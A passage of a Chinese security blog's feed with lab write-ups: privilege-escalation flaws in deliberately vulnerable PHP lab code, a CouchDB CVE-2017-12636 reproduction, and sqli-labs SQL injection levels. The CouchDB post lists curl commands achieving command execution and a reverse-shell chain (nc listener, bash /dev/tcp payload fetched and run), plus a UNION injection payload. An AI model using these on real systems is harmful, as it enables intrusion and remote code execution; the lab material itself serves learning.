&lt;th&gt;&amp;nbsp;USERNAME&amp;nbsp;  &lt;/th&gt;            &lt;th&gt;&amp;nbsp;PASSWORD&amp;nbsp;  &lt;/th&gt;        &lt;/tr&gt;        &lt;/font&gt;        &lt;/font&gt;        &lt;?php        while ($row = mysql_fetch_assoc($result))            {            echo &#39;&lt;font color= &quot;#00FF11&quot; size=&quot;3&quot;&gt;&#39;;                    echo &quot;&lt;tr&gt;&quot;;                echo &quot;&lt;td&gt;&quot;.$row[&#39;id&#39;].&quot;&lt;/td&gt;&quot;;                echo &quot;&lt;td&gt;&quot;.$row[&#39;username&#39;].&quot;&lt;/td&gt;&quot;;                echo &quot;&lt;td&gt;&quot;.$row[&#39;password&#39;].&quot;&lt;/td&gt;&quot;;            echo &quot;&lt;/tr&gt;&quot;;            echo &quot;&lt;/font&gt;&quot;;            }            echo &quot;&lt;/table&gt;&quot;;        }    }        else    {        echo &quot;Please input parameter as SORT with numeric value&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;        echo &#39;&lt;img src=&quot;../images/Less-47.jpg&quot; /&gt;&lt;br&gt;&#39;;        echo &quot;Lesson Concept and code by &lt;b&gt;D4rk&lt;/b&gt;&quot;;    }?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/center&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><p>和第47关一样没有回显，只能使用盲注和延时注入</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Over-authority learning</title>
      <link href="/posts/a51c9bbc.html"/>
      <url>/posts/a51c9bbc.html</url>
      <content type="html"><![CDATA[<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul><li>前言</li><li>越权漏洞学习</li><li>总结</li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天学习了越权漏洞，对此漏洞了解和总结了一些方法。感觉还行<img src="https://image.uc.cn/o/wemedia/s/upload/2018/7fc84bb15e045e857e822f83a5f10d95.jpg;,4,jpegx;3,700x.jpg" alt=""></p><h2 id="越权漏洞学习"><a href="#越权漏洞学习" class="headerlink" title="越权漏洞学习"></a>越权漏洞学习</h2><hr><ul><li>越权漏洞的形成</li><li>越权分类</li><li>其他越权</li><li>实验</li></ul><p><b>越权漏洞的形成</b></p><hr><p>由于程序员在处理数据查询的时候，没有对查询参数进行越权判断。导致越权漏洞的发生，这个漏洞 可以说是极为威胁的。因为在漏洞处你可以获取整站的数据，甚至将自己提升为管理员权限<br><b>越权分类</b></p><hr><p>越权限漏洞分为两类：</p><ul><li>平行越权</li><li>垂直越权</li></ul><p>平行越权：</p><pre><code>修改存在越权漏洞的参数可以查询到别人的信息</code></pre><p>垂直越权</p><pre><code>比如在登录的时候有个参数用来判断是什么权限，1是管理员权限，0是普通用户权限。那么我修改这个id即可达到用普通用户登录但拥有管理员权限，这就是垂直越权。</code></pre><p><b>其他越权</b></p><hr><p>越权不是只有web才有，其他的也有。比如软件，插件，其他的一些东东<br>文章：<a href="https://paper.tuisec.win/detail/536a63379b2ad55" target="_blank" rel="noopener">使用MailSniper越权访问Exchange邮箱</a></p><p><b>实验</b></p><hr><p>我们来看个存在平行越权漏洞的代码</p><pre><code class="php">&lt;?php/** * Created by runner.han * There is nothing new under the sun */$SELF_PAGE = substr($_SERVER[&#39;PHP_SELF&#39;],strrpos($_SERVER[&#39;PHP_SELF&#39;],&#39;/&#39;)+1);if ($SELF_PAGE = &quot;op1_login.php&quot;){    $ACTIVE = array(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;active open&#39;,&#39;&#39;,&#39;active&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);}$PIKA_ROOT_DIR =  &quot;../../../&quot;;include_once $PIKA_ROOT_DIR . &#39;header.php&#39;;include_once $PIKA_ROOT_DIR.&#39;inc/mysql.inc.php&#39;;include_once $PIKA_ROOT_DIR.&#39;inc/function.php&#39;;include_once $PIKA_ROOT_DIR.&#39;inc/config.inc.php&#39;;$link=connect();// 判断是否登录，没有登录不能访问if(!check_op_login($link)){    header(&quot;location:op1_login.php&quot;);}$html=&#39;&#39;;if(isset($_GET[&#39;submit&#39;]) &amp;&amp; $_GET[&#39;username&#39;]!=null){    //没有使用session来校验,而是使用的传进来的值，权限校验出现问题,这里应该跟登录态关系进行绑定    $username=escape($link, $_GET[&#39;username&#39;]);    $query=&quot;select * from member where username=&#39;$username&#39;&quot;; /*没有任何判断的$usernaem,而且变量可控，通过修改username可达到水平越权*/    $result=execute($link, $query);    if(mysqli_num_rows($result)==1){        $data=mysqli_fetch_assoc($result);        $uname=$data[&#39;username&#39;];        $sex=$data[&#39;sex&#39;];        $phonenum=$data[&#39;phonenum&#39;];        $add=$data[&#39;address&#39;];        $email=$data[&#39;email&#39;];        $html.=&lt;&lt;&lt;A&lt;div id=&quot;per_info&quot;&gt;   &lt;h1 class=&quot;per_title&quot;&gt;hello,{$uname},你的具体信息如下：&lt;/h1&gt;   &lt;p class=&quot;per_name&quot;&gt;姓名:{$uname}&lt;/p&gt;   &lt;p class=&quot;per_sex&quot;&gt;性别:{$sex}&lt;/p&gt;   &lt;p class=&quot;per_phone&quot;&gt;手机:{$phonenum}&lt;/p&gt;       &lt;p class=&quot;per_add&quot;&gt;住址:{$add}&lt;/p&gt;    &lt;p class=&quot;per_email&quot;&gt;邮箱:{$email}&lt;/p&gt; &lt;/div&gt;A;    }}if(isset($_GET[&#39;logout&#39;]) &amp;&amp; $_GET[&#39;logout&#39;] == 1){    session_unset();    session_destroy();    setcookie(session_name(),&#39;&#39;,time()-3600,&#39;/&#39;);    header(&quot;location:op1_login.php&quot;);}?&gt;&lt;div class=&quot;main-content&quot;&gt;    &lt;div class=&quot;main-content-inner&quot;&gt;        &lt;div class=&quot;breadcrumbs ace-save-state&quot; id=&quot;breadcrumbs&quot;&gt;            &lt;ul class=&quot;breadcrumb&quot;&gt;                &lt;li&gt;                    &lt;i class=&quot;ace-icon fa fa-home home-icon&quot;&gt;&lt;/i&gt;                    &lt;a href=&quot;../op.php&quot;&gt;Over Permission&lt;/a&gt;                &lt;/li&gt;                &lt;li class=&quot;active&quot;&gt;op1 member&lt;/li&gt;            &lt;/ul&gt;&lt;!-- /.breadcrumb --&gt;            &lt;a href=&quot;#&quot; style=&quot;float:right&quot; data-container=&quot;body&quot; data-toggle=&quot;popover&quot; data-placement=&quot;bottom&quot; title=&quot;tips(再点一下关闭)&quot;               data-content=&quot;这里可以查别人的信息吗?&quot;&gt;                点一下提示~            &lt;/a&gt;        &lt;/div&gt;        &lt;div class=&quot;page-content&quot;&gt;            &lt;div id=&quot;mem_main&quot;&gt;                &lt;p class=&quot;mem_title&quot;&gt;欢迎来到个人信息中心  | &lt;a style=&quot;color:bule;&quot; href=&quot;op1_mem.php?logout=1&quot;&gt;退出登录&lt;/a&gt;&lt;/p&gt;                &lt;form class=&quot;msg1&quot; method=&quot;get&quot;&gt;                    &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;&lt;?php echo $_SESSION[&#39;op&#39;][&#39;username&#39;]; ?&gt;&quot; /&gt;                    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;点击查看个人信息&quot; /&gt;                &lt;/form&gt;                &lt;?php echo $html;?&gt;            &lt;/div&gt;        &lt;/div&gt;&lt;!-- /.page-content --&gt;    &lt;/div&gt;&lt;/div&gt;&lt;!-- /.main-content --&gt;&lt;?phpinclude_once $PIKA_ROOT_DIR . &#39;footer.php&#39;;?&gt;</code></pre><p>从代码里可以看出，$username变量可控，而且没做任何过判断，存在水平越权<br>这里有两个用户</p><pre><code>username:lilipassword:123456username:lucypassword:12346</code></pre><p>用lili的登录查询个人信息<br><img src="https://s2.ax1x.com/2019/02/10/kUqcTg.png" alt="kUqcTg.png"></p><p>尝试将lili修改为lucy<br><img src="https://s2.ax1x.com/2019/02/10/kUqWfs.png" alt="kUqWfs.png"></p><p>成功查询到lucy的个人信息</p><p>垂直越权：<br>op2_admin_edit.php</p><pre><code class="php">&lt;?php/** * Created by runner.han * There is nothing new under the sun */$SELF_PAGE = substr($_SERVER[&#39;PHP_SELF&#39;],strrpos($_SERVER[&#39;PHP_SELF&#39;],&#39;/&#39;)+1);if ($SELF_PAGE = &quot;op2_admin_edit.php&quot;){    $ACTIVE = array(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;active open&#39;,&#39;&#39;,&#39;&#39;,&#39;active&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);}$PIKA_ROOT_DIR =  &quot;../../../&quot;;include_once $PIKA_ROOT_DIR . &#39;header.php&#39;;include_once $PIKA_ROOT_DIR.&#39;inc/mysql.inc.php&#39;;include_once $PIKA_ROOT_DIR.&#39;inc/function.php&#39;;include_once $PIKA_ROOT_DIR.&#39;inc/config.inc.php&#39;;$link=connect();// 判断是否登录，没有登录不能访问//这里只是验证了登录状态，并没有验证级别，所以存在越权问题。if(!check_op2_login($link)){    header(&quot;location:op2_login.php&quot;);    exit();}if(isset($_POST[&#39;submit&#39;])){    if($_POST[&#39;username&#39;]!=null &amp;&amp; $_POST[&#39;password&#39;]!=null){//用户名密码必填        $getdata=escape($link, $_POST);//转义        $query=&quot;insert into member(username,pw,sex,phonenum,email,address) values(&#39;{$getdata[&#39;username&#39;]}&#39;,md5(&#39;{$getdata[&#39;password&#39;]}&#39;),&#39;{$getdata[&#39;sex&#39;]}&#39;,&#39;{$getdata[&#39;phonenum&#39;]}&#39;,&#39;{$getdata[&#39;email&#39;]}&#39;,&#39;{$getdata[&#39;address&#39;]}&#39;)&quot;;        $result=execute($link, $query);        if(mysqli_affected_rows($link)==1){//判断是否插入            header(&quot;location:op2_admin.php&quot;);        }else {            $html.=&quot;&lt;p&gt;修改失败,请检查下数据库是不是还是活着的&lt;/p&gt;&quot;;        }    }}if(isset($_GET[&#39;logout&#39;]) &amp;&amp; $_GET[&#39;logout&#39;] == 1){    session_unset();    session_destroy();    setcookie(session_name(),&#39;&#39;,time()-3600,&#39;/&#39;);    header(&quot;location:op2_login.php&quot;);}?&gt;&lt;div class=&quot;main-content&quot;&gt;    &lt;div class=&quot;main-content-inner&quot;&gt;        &lt;div class=&quot;breadcrumbs ace-save-state&quot; id=&quot;breadcrumbs&quot;&gt;            &lt;ul class=&quot;breadcrumb&quot;&gt;                &lt;li&gt;                    &lt;i class=&quot;ace-icon fa fa-home home-icon&quot;&gt;&lt;/i&gt;                    &lt;a href=&quot;../op.php&quot;&gt;Over Permission&lt;/a&gt;                &lt;/li&gt;                &lt;li class=&quot;active&quot;&gt;op2 admin edit&lt;/li&gt;            &lt;/ul&gt;&lt;!-- /.breadcrumb --&gt;            &lt;a href=&quot;#&quot; style=&quot;float:right&quot; data-container=&quot;body&quot; data-toggle=&quot;popover&quot; data-placement=&quot;bottom&quot; title=&quot;tips(再点一下关闭)&quot;               data-content=&quot;想知道当超级boss是什么滋味吗&quot;&gt;                点一下提示~            &lt;/a&gt;        &lt;/div&gt;        &lt;div class=&quot;page-content&quot;&gt;            &lt;div id=&quot;edit_main&quot;&gt;                &lt;p class=&quot;edit_title&quot;&gt;hi,&lt;?php if($_SESSION[&#39;op2&#39;][&#39;username&#39;]){echo $_SESSION[&#39;op2&#39;][&#39;username&#39;];} ?&gt;,欢迎来到后台管理中心 | &lt;a style=&quot;color:bule;&quot; href=&quot;op2_admin_edit.php?logout=1&quot;&gt;退出登录&lt;/a&gt;|&lt;a href=&quot;op2_admin.php&quot;&gt;回到admin&lt;/a&gt;&lt;/p&gt;                &lt;form class=&quot;from_main&quot; method=&quot;post&quot;&gt;                    &lt;label&gt;用户:&lt;br /&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;必填&quot;/&gt;&lt;/label&gt;&lt;br /&gt;                    &lt;label&gt;密码:&lt;br /&gt;&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;必填&quot;/&gt;&lt;/label&gt;&lt;br /&gt;                    &lt;label&gt;性别:&lt;br /&gt;&lt;input type=&quot;text&quot; name=&quot;sex&quot; /&gt;&lt;/label&gt;&lt;br /&gt;                    &lt;label&gt;电话:&lt;br /&gt;&lt;input type=&quot;text&quot; name=&quot;phonenum&quot; /&gt;&lt;/label&gt;&lt;br /&gt;                    &lt;label&gt;邮箱:&lt;br /&gt;&lt;input type=&quot;text&quot; name=&quot;email&quot; /&gt;&lt;/label&gt;&lt;br /&gt;                    &lt;label&gt;地址:&lt;br /&gt;&lt;input type=&quot;text&quot; name=&quot;address&quot; /&gt;&lt;/label&gt;&lt;br /&gt;                    &lt;input class=&quot;sub&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;创建&quot; /&gt;                &lt;/form&gt;            &lt;/div&gt;        &lt;/div&gt;&lt;!-- /.page-content --&gt;    &lt;/div&gt;&lt;/div&gt;&lt;!-- /.main-content --&gt;&lt;?phpinclude_once $PIKA_ROOT_DIR . &#39;footer.php&#39;;?&gt;</code></pre><p>有两个用户</p><pre><code>admin/123456,pikachu/000000,admin是超级boss</code></pre><p>用pikachu登录<br><img src="https://s2.ax1x.com/2019/02/10/kUj45F.png" alt="kUj45F.png"></p><p>直接访问admin_edit.php<br><img src="https://s2.ax1x.com/2019/02/10/kUjXVK.png" alt="kUjXVK.png"><br>可以为所欲为了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><hr><p>在学习此漏洞之前看了一些有关越权的文章<br>Referer：<br><a href="https://paper.tuisec.win/detail/0cd79c338850fda" target="_blank" rel="noopener">逻辑让我崩溃之越权姿势分享</a><br><a href="https://paper.tuisec.win/detail/c9e403c66a43b16" target="_blank" rel="noopener">逻辑让我崩溃之越权姿势分享(续集)</a><br><a href="https://paper.tuisec.win/detail/f291ea2a5a02acd" target="_blank" rel="noopener">黑盒测试 | 某招聘系统CSRF越权修改</a><br><a href="https://paper.tuisec.win/detail/5a915c2f0ad519e" target="_blank" rel="noopener">SRCMS 多处越权+权限提升管理员漏洞</a><br><a href="https://paper.tuisec.win/detail/eadb720f9336bed" target="_blank" rel="noopener">ebay旗下电商平台magento go越权管理任意店铺</a><br><a href="https://www.secquan.org/News/1068176" target="_blank" rel="noopener">https://www.secquan.org/News/1068176</a></p><p>挖越权时注意一下几点：</p><ul><li style="list-style: none"><input type="checkbox"> 抓包看请求头和参数，能改的都改一下看一下会不会返回不同的</li><li style="list-style: none"><input type="checkbox"> 如果表单里面有个/添加个value是否会显示出来从而越权，</li></ul><pre><code>&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt;</code></pre><ul><li style="list-style: none"><input type="checkbox"> 通过收集请求变量名然后对应返回的结果，用Burp进行Fuzz测试有可能可以越权</li><li style="list-style: none"><input type="checkbox"> 登录或者执行其他操作的时候数据包里是否有判断权限的参数如果有修改一下是否能达到垂直越权</li><li style="list-style: none"><input type="checkbox"> 去掉一些参数进行请求能否获取一样的数据？或者说返回报错信息，如果是加密信息构造明文信息是否返回一样的结果？</li><li style="list-style: none"><input type="checkbox"> 如果是白盒测试，注意是否有对进行查询的参数进行过滤？自行修改能否越权</li><li style="list-style: none"><input type="checkbox"> 白盒测试时，如果审计代码时发现某个敏感目录没有做权限判断可以直接访问那么就找到一个越权了</li><li style="list-style: none"><input type="checkbox"> 在请求的时候进行HTTP污染能否达到越来权？比如多增加一个一样的请求名</li></ul><p>挖越权之前可以看一下上面的文章找一下感觉</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>CVE-2017-12636 recurrent</title>
      <link href="/posts/67b377fa.html"/>
      <url>/posts/67b377fa.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>继续复现CVE，这次是CVE-2017-12636<br><img src="http://n.sinaimg.cn/front/400/w1280h720/20190110/t1hw-hrkkweh6498780.jpg" alt="t1hw-hrkkweh6498780.jpg"></p><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><hr><p>CVE-2017-12636漏洞在于CouchDB自身的设计问题，CouchDB在query_server中引入了外部的二进制程序来执行命令，我们可以通过CouchDB自身提供的Restful API接口动态修改保存配置，从而执行系统命令<br>这里我只复现1.6版本的</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><hr><p>下载vulhub，进入对应CVE文件夹，执行：</p><pre><code>docker-compose up -d</code></pre><p>搭建成功后访问，能看到如下图所示</p><pre><code>http://127.0.0.1:5983</code></pre><p><img src="https://s2.ax1x.com/2019/02/09/kNqK4s.png" alt="kNqK4s.png"></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><hr><p>利用要求：需要拥有一个管理员账号<br>使用CVE-2017-12635来添加一个账号<br><img src="https://s2.ax1x.com/2019/02/09/kNq1g0.png" alt="kNq1g0.png"></p><pre><code>username:vulhubpassword:vulhub</code></pre><p>依次执行以下命令则可命令执行：</p><pre><code>curl -X PUT &#39;http://vulhub:vulhub@192.168.190.128:5984/_config/query_servers/cmd&#39; -d &#39;&quot;id &gt;/tmp/success&quot;&#39;curl -X PUT &#39;http://vulhub:vulhub@192.168.190.128:5984/vultest&#39;curl -X PUT &#39;http://vulhub:vulhub@192.168.190.128:5984/vultest/vul&#39; -d &#39;{&quot;_id&quot;:&quot;770895a97726d5ca6d70a22173005c7b&quot;}&#39;curl -X POST &#39;http://vulhub:vulhub@192.168.190.128:5984/vultest/_temp_view?limit=10&#39; -d &#39;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&#39; -H &#39;Content-Type:application/json&#39;</code></pre><p>结果如下：<br><img src="https://s2.ax1x.com/2019/02/09/kNqNE4.png" alt="kNqNE4.png"></p><p><img src="https://s2.ax1x.com/2019/02/09/kNqDv6.png" alt="kNqDv6.png"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><hr><p>操作如下：</p><pre><code>1.先用nc在kali监听nc -lvp 99992.用python -m SimpleHttpsServer 8083在kali搭建一个简单的http服务3.在根目录创建一个index.html写入bash -i &gt;&amp; /dev/tcp/192.168.241.128/9000 0&gt;&amp;14.执行以下命令即可获得一个shell</code></pre><p>命令如下：</p><pre><code>curl -X PUT http://vulhub:vulhub@192.168.241.128:5984/_node/nonode@nohost/_config/query_servers/cmd -d &#39;&quot;curl 192.168.241.128:8083/ -o /tmp/bashshell&quot;&#39;curl -X POST &#39;http://vulhub:vulhub@192.168.241.128:5984/vultest/_temp_view?limit=10&#39; -d &#39;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&#39; -H &#39;Content-Type:application/json&#39;curl -X PUT http://vulhub:vulhub@192.168.241.128:5984/_node/nonode@nohost/_config/query_servers/cmd -d &#39;&quot;bash /tmp/bashshell&quot;&#39;curl -X POST &#39;http://vulhub:vulhub@192.168.241.128:5984/vultest/_temp_view?limit=10&#39; -d &#39;{&quot;language&quot;:&quot;cmd&quot;,&quot;map&quot;:&quot;&quot;}&#39; -H &#39;Content-Type:application/json&#39;</code></pre><p>我这里将命令扔进demo.sh</p><p><img src="https://s2.ax1x.com/2019/02/09/kNq2UH.png" alt="kNq2UH.png"></p><p><img src="https://s2.ax1x.com/2019/02/09/kNqbVg.md.png" alt="kNqbVg.md.png"></p><p><img src="https://s2.ax1x.com/2019/02/09/kNqL5j.md.png" alt="kNqL5j.md.png"></p><p><img src="https://s2.ax1x.com/2019/02/09/kNLSMV.png" alt="kNLSMV.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>sqli-labs Less 41 -&gt; Less 45</title>
      <link href="/posts/a2e73b2e.html"/>
      <url>/posts/a2e73b2e.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>继续闯sqli-labs，这次从41到45关。感觉后面的都是用来复习的<br><img src="http://i2.hdslb.com/bfs/archive/ca6c6074431a74787b0b6ea99d8605702cdefe7e.jpg" alt="ca6c6074431a74787b0b6ea99d8605702cdefe7e.jpg"></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><hr><p> <b>第四十一关</b></p><hr><p> 代码如下：</p><pre><code class="php"> &lt;?phperror_reporting(0);include(&quot;../sql-connections/db-creds.inc&quot;);?&gt;&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;Less-41 **stacked Query Intiger type blind**&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;?php// take the variables if(isset($_GET[&#39;id&#39;])){$id=$_GET[&#39;id&#39;];//logging the connection parameters to a file for analysis.$fp=fopen(&#39;result.txt&#39;,&#39;a&#39;);fwrite($fp,&#39;ID:&#39;.$id.&quot;\n&quot;);fclose($fp);// connectivity//mysql connections for stacked query examples.$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);// Check connectionif (mysqli_connect_errno($con1)){    echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();}else{    @mysqli_select_db($con1, $dbname) or die ( &quot;Unable to connect to the database: $dbname&quot;);}$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;/* execute multi query */if (mysqli_multi_query($con1, $sql)){    /* store first result set */    if ($result = mysqli_store_result($con1))    {        if($row = mysqli_fetch_row($result))        {            echo &#39;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#39;;                printf(&quot;Your Username is : %s&quot;, $row[1]);            echo &quot;&lt;br&gt;&quot;;            printf(&quot;Your Password is : %s&quot;, $row[2]);            echo &quot;&lt;br&gt;&quot;;            echo &quot;&lt;/font&gt;&quot;;        }//            mysqli_free_result($result);    }        /* print divider */    if (mysqli_more_results($con1))    {            //printf(&quot;-----------------\n&quot;);    }     //while (mysqli_next_result($con1));}/* close connection */mysqli_close($con1);}    else { echo &quot;Please input the ID as parameter with numeric value&quot;;}?&gt;&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;&lt;img src=&quot;../images/Less-41.jpg&quot; /&gt;&lt;/center&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>无任何过滤</p><pre><code>payload:http://127.0.0.1/sqli-labs-master/Less-41/?id=0%20union%20select%201,@@basedir,@@datadir</code></pre><p><img src="https://s2.ax1x.com/2019/02/08/kNKwNQ.png" alt="kNKwNQ.png"></p><p><b>第四十二关</b></p><hr><p>代码如下：</p><pre><code class="php">&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body bgcolor=&quot;#000000&quot;&gt;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&lt;div align=&quot;right&quot;&gt;&lt;a style=&quot;font-size:.8em;color:#FFFF00&quot; href=&#39;index.php&#39;&gt;&lt;img src=&quot;../images/Home.png&quot; height=&#39;45&#39;; 